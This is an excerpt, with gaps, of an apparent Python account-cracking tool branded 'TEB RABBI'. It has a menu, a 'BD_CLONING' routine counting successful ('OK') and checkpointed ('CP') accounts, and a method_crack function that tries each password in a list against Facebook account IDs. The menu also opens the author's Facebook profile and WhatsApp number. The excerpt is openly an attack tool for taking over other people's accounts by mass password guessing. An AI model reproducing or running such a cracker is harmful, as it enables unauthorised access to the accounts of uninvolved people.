...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : TEB RABBI ]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def TARA_LOVE():
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/profile.php?id=100072425385396');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801999014197+');time.sleep(1)
    else:
...
def BD_CLONING():
    ...
    print(' RABBI OK ID '+str(len(oks)))
    print(' RABBI CP ID '+str(len(cps)))
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[RABBI] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
